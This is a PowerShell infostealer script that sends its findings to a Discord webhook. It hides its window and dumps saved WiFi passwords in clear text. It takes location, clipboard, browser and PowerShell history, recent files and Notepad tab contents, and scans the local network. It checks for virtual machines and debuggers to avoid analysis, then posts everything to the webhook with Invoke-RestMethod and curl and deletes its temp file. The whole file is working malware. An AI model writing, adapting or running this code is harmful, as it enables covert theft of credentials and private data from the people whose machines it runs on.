# SYSTEM INFO TO DISCORD

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'hideme'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

sleep 1
Add-Type -AssemblyName System.Windows.Forms

$hookurl = "$dc"

# Send a notification to discord on start
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

# User Information
$userInfo = Get-WmiObject -Class Win32_UserAccount
$fullName = $($userInfo.FullName) ;$fullName = ("$fullName").TrimStart("")
$email = (Get-ComputerInfo).WindowsRegisteredOwner

# Other Users
$users = "$($userInfo.Name)"
$userString = "`nFull Name : $($userInfo.FullName)"

# System Language
$systemLocale = Get-WinSystemLocale
$systemLanguage = $systemLocale.Name

#Keyboard Layout
$userLanguageList = Get-WinUserLanguageList
$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]

# OS Information
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$OSString = "$($systemInfo.Caption)"
$WinVersion = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
$OSArch = "$($systemInfo.OSArchitecture)"
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width;$Height = $Screen.Height
$screensize = "${width} x ${height}"

# Enumerate Windows Activation Date
function Convert-BytesToDatetime([byte[]]$b) { 
    [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
    $script:activated = [datetime]::FromFileTime($f)
}
$RegKey = (Get-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy 
$totalSize = ([System.BitConverter]::ToUInt32($RegKey,0))
$policies = @()
$value = 0x14
while ($true){
    $keySize = ([System.BitConverter]::ToUInt16($RegKey,$value))
    $keyNameSize = ([System.BitConverter]::ToUInt16($RegKey,$value+2))
    $keyDataSize = ([System.BitConverter]::ToUInt16($RegKey,$value+6))
    $keyName = [System.Text.Encoding]::Unicode.GetString($RegKey[($value+0x10)..($value+0xF+$keyNameSize)])
    if ($keyName -eq 'Security-SPP-LastWindowsActivationTime'){
        Convert-BytesToDatetime($RegKey[($value+0x10+$keyNameSize)..($value+0xF+$keyNameSize+$keyDataSize)])
    }
    $value += $keySize
    if (($value+4) -ge $totalSize){
        break
    }
}

# GPS Location Info
Add-Type -AssemblyName System.Device
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
$GeoWatcher.Start()
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {Sleep -M 100}  
if ($GeoWatcher.Permission -eq 'Denied'){$GPS = "Location Services Off"}
else{
	$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude
	$GL = $GL -split " "
	$Lat = $GL[0].Substring(11) -replace ".$"
	$Lon = $GL[1].Substring(10) -replace ".$"
    $GPS = "LAT = $Lat LONG = $Lon"
}

# Hardware Information
$processorInfo = Get-WmiObject -Class Win32_Processor; $processor = "$($processorInfo.Name)"
$videocardinfo = Get-WmiObject Win32_VideoController; $gpu = "$($videocardinfo.Name)"
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem | Out-String
$computerSystemInfo = $computerSystemInfo -split "`r?`n" | Where-Object { $_ -ne '' } | Out-String

# HDD Information
$HddInfo = Get-WmiObject Win32_LogicalDisk | 
    Select-Object DeviceID, VolumeName, FileSystem, 
        @{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, 
        @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, 
        @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | 
    Format-List
$HddInfo = ($HddInfo | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }

# Disk Health
$DiskHealth = Get-PhysicalDisk | 
    Select-Object FriendlyName, OperationalStatus, HealthStatus | 
    Format-List
$DiskHealth = ($DiskHealth | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }

# Current System Metrics
function Get-PerformanceMetrics {
    $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue

    return [PSCustomObject]@{
        CPUUsage = "{0:F2}" -f $cpuUsage.CookedValue
        MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
        DiskIO = "{0:F2}" -f $diskIO.CookedValue
        NetworkIO = "{0:F2}" -f $networkIO.CookedValue
    }
}
$metrics = Get-PerformanceMetrics
$PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
$PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
$PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
$PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"

#Anti-virus Info
$AVinfo = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
$AVinfo | ForEach-Object { $_.Trim() }
$AVinfo = ($AVinfo | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }

# Enumerate Network Public IP
$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

# Saved WiFi Network Info
$outssid = $null
$a=0
$ws=(netsh wlan show profiles) -replace ".*:\s+"
foreach($s in $ws){
    if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){
        $ssid=$s.Trim()
        if($s -Match ":"){
            $ssid=$s.Split(":")[1].Trim()
            }
        $pw=(netsh wlan show profiles name=$ssid key=clear)
        $pass="None"
        foreach($p in $pw){
            if($p -Match "Key Content"){
            $pass=$p.Split(":")[1].Trim()
            $outssid+="SSID: $ssid | Password: $pass`n"
            }
        }
    }
    $a++
}

# Get the local IPv4 address
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)

if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
    $subnet = $matches[1]

    1..254 | ForEach-Object {
        Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
    }

    # Retrieve the list of computers in the subnet
    $Computers = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +',',' | ConvertFrom-Csv -Header Computername,IPv4,MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername

    # Add Hostname property and build scan result
    $scanresult = ""
    $Computers | ForEach-Object {
        try {
            $ip = $_.IPv4
            $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
        } catch {
            $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)" -Force
        }

        $scanresult += "IP Address: $($_.IPv4) `n"
        $scanresult += "MAC Address: $($_.MAC) `n"
        if ($_.Hostname) {
            $scanresult += "Hostname: $($_.Hostname) `n"
        }
        $scanresult += "`n"
    }
}

# Nearby WiFi Networks
$showNetworks = explorer.exe ms-availablenetworks:
sleep 4
$wshell = New-Object -ComObject wscript.shell
$wshell.AppActivate('explorer.exe')
$tab = 0
while ($tab -lt 6){
$wshell.SendKeys('{TAB}')
$tab++
}
$wshell.SendKeys('{ENTER}')
$wshell.SendKeys('{TAB}')
$wshell.SendKeys('{ESC}')
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
$Wifi = ($NearbyWifi|Out-String)


#Virtual Machine Detection Setup
$isVM = $false
$isDebug = $false
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$Width = $screen.Bounds.Width
$Height = $screen.Bounds.Height
$networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null }
$services = Get-Service
$vmServices = @('vmtools', 'vmmouse', 'vmhgfs', 'vmci', 'VBoxService', 'VBoxSF')
$manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
$vmManufacturers = @('Microsoft Corporation', 'VMware, Inc.', 'Xen', 'innotek GmbH', 'QEMU')
$model = (Get-WmiObject Win32_ComputerSystem).Model
$vmModels = @('Virtual Machine', 'VirtualBox', 'KVM', 'Bochs')
$bios = (Get-WmiObject Win32_BIOS).Manufacturer
$vmBios = @('Phoenix Technologies LTD', 'innotek GmbH', 'Xen', 'SeaBIOS')
$runningTaskManagers = @()

# Debugger Check
Add-Type @"
        using System;
        using System.Runtime.InteropServices;

        public class DebuggerCheck {
            [DllImport("kernel32.dll")]
            public static extern bool IsDebuggerPresent();

            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        }
"@
$isDebuggerPresent = [DebuggerCheck]::IsDebuggerPresent()
$isRemoteDebuggerPresent = $false
[DebuggerCheck]::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$isRemoteDebuggerPresent) | Out-Null
if ($isDebuggerPresent -or $isRemoteDebuggerPresent) {
    $script:isdebug = $true
}

#Virtual Machine Indicators
$commonResolutions = @("1280x720","1280x800","1280x1024","1366x768","1440x900","1600x900","1680x1050","1920x1080","1920x1200","2560x1440","3840x2160")
$vmChecks = @{"VMwareTools" = "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools";"VMwareMouseDriver" = "C:\WINDOWS\system32\drivers\vmmouse.sys";"VMwareSharedFoldersDriver" = "C:\WINDOWS\system32\drivers\vmhgfs.sys";"SystemBiosVersion" = "HKLM:\HARDWARE\Description\System\SystemBiosVersion";"VBoxGuestAdditions" = "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions";"VideoBiosVersion" = "HKLM:\HARDWARE\Description\System\VideoBiosVersion";"VBoxDSDT" = "HKLM:\HARDWARE\ACPI\DSDT\VBOX__";"VBoxFADT" = "HKLM:\HARDWARE\ACPI\FADT\VBOX__";"VBoxRSDT" = "HKLM:\HARDWARE\ACPI\RSDT\VBOX__";"SystemBiosDate" = "HKLM:\HARDWARE\Description\System\SystemBiosDate";}
$taskManagers = @("taskmgr","procmon","procmon64","procexp","procexp64","perfmon","perfmon64","resmon","resmon64","ProcessHacker")
$currentResolution = "$Width`x$Height"
if (!($commonResolutions -contains $currentResolution)) {$rescheck = "Resolution Check : FAIL"}else{$rescheck = "Resolution Check : PASS"}
if ($vmManufacturers -contains $manufacturer) {$ManufaturerCheck = "Manufaturer Check : FAIL"}else{$ManufaturerCheck = "Manufaturer Check : PASS"}
if ($vmModels -contains $model) {$ModelCheck = "Model Check : FAIL"}else{$ModelCheck = "Model Check : PASS"}
if ($vmBios -contains $bios) {$BiosCheck = "Bios Check : FAIL"}else{$BiosCheck = "Bios Check : PASS"}

foreach ($service in $vmServices) {if ($services -match $service) {$script:isVM = $true}}
foreach ($check in $vmChecks.GetEnumerator()) {if (Test-Path $check.Value) {$script:isVM = $true}}
foreach ($adapter in $networkAdapters) {
    $macAddress = $adapter.MACAddress -replace ":", ""
    if ($macAddress.StartsWith("080027")) {$script:isVM = $true}
    elseif ($macAddress.StartsWith("000569") -or $macAddress.StartsWith("000C29") -or $macAddress.StartsWith("001C14")) {$script:isVM = $true}
}

# List Running Task Managers
foreach ($taskManager in $taskManagers) {
    if (Get-Process -Name $taskManager -ErrorAction SilentlyContinue) {
        $runningTaskManagers += $taskManager
    }
}
if (!($runningTaskManagers)){
    $runningTaskManagers = "None Found.."
}

if ($isVM) {   
    $vmD = "FAIL!"
}
else{
    $vmD = "PASS"
}
if ($isDebug) {
    $debugD = "FAIL!"
}
else {
    $debugD = "PASS"
 }
$vmDetect = "VM Check : $vmD"
$debugDetect = "Debugging Check : $debugD"


$clipboard = Get-Clipboard
if (!($clipboard)){
    $clipboard = "No Data Found.."
}
# History and Bookmark Data
$Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$Paths = @{
    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    'edge_bookmarks'    = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}
$Browsers = @('chrome', 'edge', 'firefox', 'opera')
$DataValues = @('history', 'bookmarks')
$outpath = "$env:temp\Browsers.txt"
foreach ($Browser in $Browsers) {
    foreach ($DataValue in $DataValues) {
        $PathKey = "${Browser}_${DataValue}"
        $Path = $Paths[$PathKey]

        $entry = Get-Content -Path $Path | Select-String -AllMatches $Expression | % {($_.Matches).Value} | Sort -Unique

        $entry | ForEach-Object {
            [PSCustomObject]@{
                Browser  = $Browser
                DataType = $DataValue
                Content = $_
            }
        } | Out-File -FilePath $outpath -Append
    }
}
$entry = Get-Content -Path $outpath
$entry = ($entry | Out-String)

# System Information
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices| Out-String)
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process| Out-String)
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}; $service = ($service | Out-String)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software| Out-String)
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw ;$pshistory = ($pshistory | Out-String) 
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime;$RecentFiles = ($RecentFiles | Out-String)

function EnumNotepad{
$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
foreach ($dir in $matchingDirectories) {
    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
    foreach ($fullFilePath in $listOfBinFiles) {
        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
            continue
        }
        $seperator = ("=" * 60)
        $SMseperator = ("-" * 60)
        $seperator | Out-File -FilePath $outpath -Append
        $filename = $fullFilePath.Name
        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
        $isSavedFile = $contents[3]
        if ($isSavedFile -eq 1) {
            $lengthOfFilename = $contents[4]
            $filenameEnding = 5 + $lengthOfFilename * 2
            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append

        } else {
            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            $filenameEnding = 0
            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
            $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
            $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
            $originalFileContent = ""
            for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                if ($originalFileBytes[$i] -ne 0) {
                    $originalFileContent += [char]$originalFileBytes[$i]
                }
            }
            $originalFileContent | Out-File -FilePath $outpath -Append
        }
     "`n" | Out-File -FilePath $outpath -Append
    }
}
}




$infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
     /        \___  |\___ \  |  | \  ___/|  Y Y  \ /_____/ |  |   |  \  | (  <_> )  | \/  Y Y  \/ __ \|  | |  (  <_> )   |  \
    /_______  / ____/____  > |__|  \___  >__|_|  /         |__|___|  /__|  \____/|__|  |__|_|  (____  /__| |__|\____/|___|  /
            \/\/         \/            \/      \/                  \/                        \/     \/                    \/ 
==================================================================================================================================
"

$infomessage1 = "
=======================================
SYSTEM INFORMATION FOR $env:COMPUTERNAME
=======================================
User Information
---------------------------------------
Current User      : $env:USERNAME
Full Name         : $fullName
Email Address     : $email
Other Users       : $users

OS Information
---------------------------------------
Language          : $systemLanguage
Keyboard Layout   : $keyboardLayoutID
Current OS        : $OSString
Build ID          : $WinVersion
Architechture     : $OSArch
Screen Size       : $screensize
Activation Date   : $activated
Location          : $GPS

Hardware Information
---------------------------------------
Processor         : $processor 
Memory            : $RamInfo
Gpu               : $gpu

System Information
---------------------------------------
$computerSystemInfo

Storage
---------------------------------------
$Hddinfo
$DiskHealth

Current System Metrics
---------------------------------------
$PMcpu
$PMmu
$PMdio
$PMnio

AntiVirus Providers
---------------------------------------
$AVinfo

Network Information
---------------------------------------
Public IP Address : $computerPubIP
Local IP Address  : $localIP

Saved WiFi Networks
---------------------------------------
$outssid

Nearby Wifi Networks
---------------------------------------
$Wifi

Other Network Devices
---------------------------------------
$scanresult

Virtual Machine Test
---------------------------------------
$rescheck
$ManufaturerCheck
$ModelCheck
$BiosCheck
$vmDetect

Debugging Software Check
---------------------------------------
$debugDetect

Running Task Managers
---------------------------------------
$runningTaskManagers

"


$infomessage2 = "

==================================================================================================================================
History Information
----------------------------------------------------------------------------------------------------------------------------------
Clipboard Contents
---------------------------------------
$clipboard

Browser History
---------------------------------------
$entry

Powershell History
---------------------------------------
$pshistory

==================================================================================================================================
Recent File Changes Information
----------------------------------------------------------------------------------------------------------------------------------
$RecentFiles

==================================================================================================================================
USB Information
----------------------------------------------------------------------------------------------------------------------------------
$usbdevices

==================================================================================================================================
Software Information
----------------------------------------------------------------------------------------------------------------------------------
$software

==================================================================================================================================
Running Services Information
----------------------------------------------------------------------------------------------------------------------------------
$service

==================================================================================================================================
Current Processes Information
----------------------------------------------------------------------------------------------------------------------------------
$process

=================================================================================================================================="

$outpath = "$env:TEMP/systeminfo.txt"
$infomessage | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage1 | Out-File -FilePath $outpath -Encoding ASCII -Append
$infomessage2 | Out-File -FilePath $outpath -Encoding ASCII -Append

if ($OSString -like '*11*'){
    EnumNotepad
}
else{
    "no notepad tabs (windows 10 or below)" | Out-File -FilePath $outpath -Encoding ASCII -Append
}


function Send-WebhookMessage {
    param (
        [string]$content
    )
$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$content"} | ConvertTo-Json
Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
}

$resultLines = $infomessage1 -split "`n"
        $currentBatch = ""
        foreach ($line in $resultLines) {
            $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)

            if (([System.Text.Encoding]::Unicode.GetByteCount($currentBatch) + $lineSize) -gt 1900) {
                Send-WebhookMessage -content "``````$currentBatch`````` "
                Start-Sleep -Seconds 1
                $currentBatch = ""
            }

            $currentBatch += $line + "`n" 
        }

        if ($currentBatch -ne "") {
            Send-WebhookMessage -content "``````$currentBatch`````` "
        }


curl.exe -F file1=@"$outpath" $hookurl
Sleep 1
Remove-Item -Path $outpath -force

